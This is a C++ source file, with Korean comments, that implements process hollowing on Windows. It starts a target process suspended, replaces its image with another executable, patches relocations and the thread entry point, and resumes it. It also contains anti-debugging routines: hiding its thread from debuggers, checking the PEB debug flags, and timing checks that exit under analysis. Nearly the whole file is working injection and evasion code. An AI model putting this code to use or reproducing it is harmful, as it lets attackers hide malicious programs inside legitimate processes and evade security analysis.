// ProcessHollowing.cpp : Defines the entry point for the console application.

#undef UNICODE

#include <Winsock2.h> // for client.exe
#include <Ws2tcpip.h> // for client.exe

#include <stdio.h>
#include <stdlib.h>

#include "stdafx.h"
#include <windows.h>
#include "internals.h"
#include "pe.h"

#pragma comment (lib, "Ws2_32.lib") // for client.exe
#pragma comment (lib, "Mswsock.lib") // for client.exe
#pragma comment (lib, "AdvApi32.lib") // for client.exe

#define DEFAULT_BUFLEN 512

void Detach_Time() {
	LARGE_INTEGER start, end, frq;
	QueryPerformanceFrequency(&frq); // 고해상도 타이머의 초당 주파수를 획득
	QueryPerformanceCounter(&start); // 시작 시점의 CPU 클럭수 획득

	HMODULE hNTDLL = LoadLibraryA("ntdll");

	if (!hNTDLL) exit(1);

	FARPROC fpZwSetInformationThread = GetProcAddress(
		hNTDLL,
		"ZwSetInformationThread"
	);

	if (!fpZwSetInformationThread) exit(1);

	_ZwSetInformationThread zwSetInformationThread =
		(_ZwSetInformationThread)fpZwSetInformationThread;
	
	QueryPerformanceCounter(&end); // 끝 지점의 클럭수 획득
	__int64 micro_interval = (end.QuadPart - start.QuadPart) / (frq.QuadPart / 1000000); // 클럭수의 차이에서 (주파수를 1000000으로 나눈값으로) 나눈값 획득
	if (micro_interval > 40) { printf("Time Expired\\n"); getchar();  exit(1); }

	zwSetInformationThread(GetCurrentThread(), 0x11, 0,0); // 0x11 : ThreadHideFromDebugger

	/* ThreadInformationClas 에
	존재하는 17 번째 멤버인 ThreadHideFromDebugger 이다.해당 멤버를 사용하게 되면
		프로그램이 계속 실행이 되도 디버거는 해당 Thread 로부터 어느 이벤트도 받지 않게
		일종의 은닉을 할 수 있게 된다.*/
}

void Being_Time() {
	LARGE_INTEGER start, end, frq;
	QueryPerformanceFrequency(&frq); // 고해상도 타이머의 초당 주파수를 획득
	QueryPerformanceCounter(&start); // 시작 시점의 CPU 클럭수 획득

	PPEB pPEB = ReadRemotePEB(GetCurrentProcess());
	if (pPEB->BeingDebugged != 0) { printf("BeingDebugged\\n"); getchar(); exit(1); }
	if (pPEB->NtGlobalFlag != 0) { printf("NtGlobalFlag is pointed Debugger\\n"); getchar(); exit(1); }

	QueryPerformanceCounter(&end); // 끝 지점의 클럭수 획득
	__int64 micro_interval = (end.QuadPart - start.QuadPart) / (frq.QuadPart / 1000000); // 클럭수의 차이에서 (주파수를 1000000으로 나눈값으로) 나눈값 획득
	if (micro_interval > 60) { printf("Time Expired\\n"); getchar(); exit(1); }
}

void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
{
	LARGE_INTEGER start, end, frq;
	QueryPerformanceFrequency(&frq); // 고해상도 타이머의 초당 주파수를 획득
	QueryPerformanceCounter(&start); // 시작 시점의 CPU 클럭수 획득

	printf("Creating process\r\n");

	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
	
	CreateProcessA
	(
		0,
		pDestCmdLine,		
		0, 
		0, 
		0, 
		CREATE_SUSPENDED, 
		0, 
		0, 
		pStartupInfo, 
		pProcessInfo
	);

	if (!pProcessInfo->hProcess)
	{
		printf("Error creating process\r\n");

		return;
	}

	PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);

	PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);

	printf("Opening source image\r\n");

	HANDLE hFile = CreateFileA
	(
		pSourceFile,
		GENERIC_READ, 
		0, 
		0, 
		OPEN_ALWAYS, 
		0, 
		0
	);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Error opening %s\r\n", pSourceFile);
		return;
	}

	DWORD dwSize = GetFileSize(hFile, 0);
	PBYTE pBuffer = new BYTE[dwSize];
	DWORD dwBytesRead = 0;
	ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, 0);

	PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);

	PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);

	printf("Unmapping destination section\r\n");

	HMODULE hNTDLL = GetModuleHandleA("ntdll");

	FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");

	_NtUnmapViewOfSection NtUnmapViewOfSection =
		(_NtUnmapViewOfSection)fpNtUnmapViewOfSection;

	DWORD dwResult = NtUnmapViewOfSection
	(
		pProcessInfo->hProcess, 
		pPEB->ImageBaseAddress
	);

	if (dwResult)
	{
		printf("Error unmapping section\r\n");
		return;
	}

	QueryPerformanceCounter(&end); // 끝 지점의 클럭수 획득
	__int64 ms_interval = (end.QuadPart - start.QuadPart) / (frq.QuadPart / 1000); // 클럭수의 차이에서 (주파수를 1000으로 나눈값으로) 나눈값 획득
	if (ms_interval > 50) exit(1);

	printf("Allocating memory\r\n");

	PVOID pRemoteImage = VirtualAllocEx
	(
		pProcessInfo->hProcess,
		pPEB->ImageBaseAddress,
		pSourceHeaders->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	printf("dest(victim) opening %p\r\n", pProcessInfo->hProcess);
	printf("dest(victim) ImageBaseAddress %p\r\n", pPEB->ImageBaseAddress);
	printf("source opening %s\r\n", pSourceFile);
	printf("pSourceHeaders->OptionalHeader.SizeOfImage: %p\n",pSourceHeaders->OptionalHeader.SizeOfImage);


	if (!pRemoteImage)
	{
		printf("VirtualAllocEx call failed\r\n");
		return;
	}

	DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress - pSourceHeaders->OptionalHeader.ImageBase;
/*
	printf
	(
		"Source image base: 0x%p\r\n"
		"Destination image base: 0x%p\r\n",
		pSourceHeaders->OptionalHeader.ImageBase,
		pPEB->ImageBaseAddress
	);
*/
	printf("Relocation delta: 0x%p\r\n", dwDelta);

	pSourceHeaders->OptionalHeader.ImageBase = (DWORD)pPEB->ImageBaseAddress;

	printf("Writing headers\r\n");

	if (!WriteProcessMemory
	(
		pProcessInfo->hProcess, 				
		pPEB->ImageBaseAddress, 
		pBuffer, 
		pSourceHeaders->OptionalHeader.SizeOfHeaders, 
		0
	))
	{
		printf("Error writing process memory\r\n");

		return;
	}

	for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
	{
		printf("%s Section Exist\r\n", pSourceImage->Sections[x].Name);
		if (!pSourceImage->Sections[x].PointerToRawData)
			continue;

		PVOID pSectionDestination =
			(PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);

		if (!WriteProcessMemory(
			pProcessInfo->hProcess,
			pSectionDestination,
			&pBuffer[pSourceImage->Sections[x].PointerToRawData],
			pSourceImage->Sections[x].SizeOfRawData,
			0)) {
			printf("Error writing process memory\r\n");
			return;
		}
	}

	if (dwDelta)
		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
		{
			char* pSectionName = ".reloc";		

			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName))) {
				continue;
			}

			printf("Rebasing image\r\n");

			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
			DWORD dwOffset = 0;

			IMAGE_DATA_DIRECTORY relocData = 
				pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

			while (dwOffset < relocData.Size)
			{
				PBASE_RELOCATION_BLOCK pBlockheader = 
					(PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];

				dwOffset += sizeof(BASE_RELOCATION_BLOCK);

				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

				PBASE_RELOCATION_ENTRY pBlocks = 
					(PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];

				for (DWORD y = 0; y <  dwEntryCount; y++)
				{
					dwOffset += sizeof(BASE_RELOCATION_ENTRY);

					if (pBlocks[y].Type == 0)
						continue;

					DWORD dwFieldAddress = 
						pBlockheader->PageAddress + pBlocks[y].Offset;

					DWORD dwBuffer = 0;
					ReadProcessMemory
					(
						pProcessInfo->hProcess, 
						(PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
						&dwBuffer,
						sizeof(DWORD),
						0
					);

					//printf("Relocating 0x%p -> 0x%p\r\n", dwBuffer, dwBuffer - dwDelta);

					dwBuffer += dwDelta;

					BOOL bSuccess = WriteProcessMemory
					(
						pProcessInfo->hProcess,
						(PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
						&dwBuffer,
						sizeof(DWORD),
						0
					);

					if (!bSuccess)
					{
						printf("Error writing memory\r\n");
						continue;
					}
				}
			}
			break;
		}


	const char* text = ".text"; // PAGE_EXECUTE_READ 0x20
	const char* rdata = ".rdata"; // PAGE_READONLY 0x02
	const char* data = ".data"; // PAGE_READWRITE 0x04
	const char* idata = ".idata"; // PAGE_READONLY 0x02
	const char* rsrc = ".rsrc"; // PAGE_READONLY 0x02
	const char* reloc = ".reloc"; // PAGE_READWRITE 0x04
	DWORD old = 0x00;
	DWORD *oldprotection = &old;

	for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++){
		
		PVOID pSectionDestination =
			(PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);

		if (memcmp(text, pSourceImage->Sections[x].Name, sizeof(text)) == 0) {
			if (!VirtualProtectEx(
				pProcessInfo->hProcess,
				pSectionDestination,
				pSourceImage->Sections[x].SizeOfRawData,
				PAGE_EXECUTE_READ,//PAGE_EXECUTE_READ,
				oldprotection)) {
				printf("Error writing %s memory protection\r\n", pSourceImage->Sections[x].Name);
				return;
			}
		}
		else if (memcmp(rdata, pSourceImage->Sections[x].Name, sizeof(rdata)) == 0) {
			if (!VirtualProtectEx(
				pProcessInfo->hProcess,
				pSectionDestination,
				pSourceImage->Sections[x].SizeOfRawData,
				PAGE_READONLY,//PAGE_READONLY,
				oldprotection)) {
				printf("Error writing %s memory protection\r\n", pSourceImage->Sections[x].Name);
				return;
			}
		}
		else if (memcmp(data, pSourceImage->Sections[x].Name, sizeof(data)) == 0) {
			if (!VirtualProtectEx(
				pProcessInfo->hProcess,
				pSectionDestination,
				pSourceImage->Sections[x].SizeOfRawData,
				PAGE_READWRITE,
				oldprotection)) {
				printf("Error writing %s memory protection\r\n", pSourceImage->Sections[x].Name);
				return;
			}
		}
		else if (memcmp(idata, pSourceImage->Sections[x].Name, sizeof(idata)) == 0) {
			if (!VirtualProtectEx(
				pProcessInfo->hProcess,
				pSectionDestination,
				pSourceImage->Sections[x].SizeOfRawData,
				PAGE_READONLY,//PAGE_READONLY,
				oldprotection)) {
				printf("Error writing %s memory protection\r\n", pSourceImage->Sections[x].Name);
				return;
			}
		}
		else if (memcmp(rsrc, pSourceImage->Sections[x].Name, sizeof(rsrc)) == 0) {
			if (!VirtualProtectEx(
				pProcessInfo->hProcess,
				pSectionDestination,
				pSourceImage->Sections[x].SizeOfRawData,
				PAGE_READONLY,//PAGE_READONLY,
				oldprotection)) {
				printf("Error writing %s memory protection\r\n", pSourceImage->Sections[x].Name);
				return;
			}
		}
		else if (memcmp(reloc, pSourceImage->Sections[x].Name, sizeof(reloc)) == 0) {
			if (!VirtualProtectEx(
				pProcessInfo->hProcess,
				pSectionDestination,
				pSourceImage->Sections[x].SizeOfRawData,
				PAGE_READWRITE,
				oldprotection)) {
				printf("Error writing %s memory protection\r\n", pSourceImage->Sections[x].Name);
				return;
			}
		}
	}

		DWORD dwBreakpoint = 0xCC;

		DWORD dwEntrypoint = (DWORD)pPEB->ImageBaseAddress +
			pSourceHeaders->OptionalHeader.AddressOfEntryPoint;

#ifdef WRITE_BP
		printf("Writing breakpoint\r\n");

		if (!WriteProcessMemory
			(
			pProcessInfo->hProcess, 
			(PVOID)dwEntrypoint, 
			&dwBreakpoint, 
			4, 
			0
			))
		{
			printf("Error writing breakpoint\r\n");
			return;
		}
#endif

		LPCONTEXT pContext = new CONTEXT();
		pContext->ContextFlags = CONTEXT_INTEGER;

		printf("Getting thread context\r\n");

		if (!GetThreadContext(pProcessInfo->hThread, pContext))
		{
			printf("Error getting context\r\n");
			return;
		}

		pContext->Eax = dwEntrypoint;			

		printf("Setting thread context\r\n");

		if (!SetThreadContext(pProcessInfo->hThread, pContext))
		{
			printf("Error setting context\r\n");
			return;
		}

		printf("Resuming thread\r\n");

		if (!ResumeThread(pProcessInfo->hThread))
		{
			printf("Error resuming thread\r\n");
			return;
		}
		
		printf("Process hollowing complete\r\n");
}

int main(int argc, char* argv[])
{
	//HWND hWnd = GetConsoleWindow(); // 현재 열린 창의 핸들 가져오기
	//ShowWindow(hWnd, SW_HIDE); // 현재 열린창을 hide

	Detach_Time();
	Being_Time();

	char* pPath = new char[MAX_PATH];
	GetModuleFileNameA(0, pPath, MAX_PATH);
	pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
	strcat_s(pPath, MAX_PATH, argv[2]);
	//strcat(pPath, argv[2]);
	//strcat(pPath, "HelloWorld.exe");
	//printf("pPath+argv[2]: %s", pPath);
	CreateHollowedProcess
	(
		argv[1],
		//"cmd",
		pPath
	);

	return 0;
}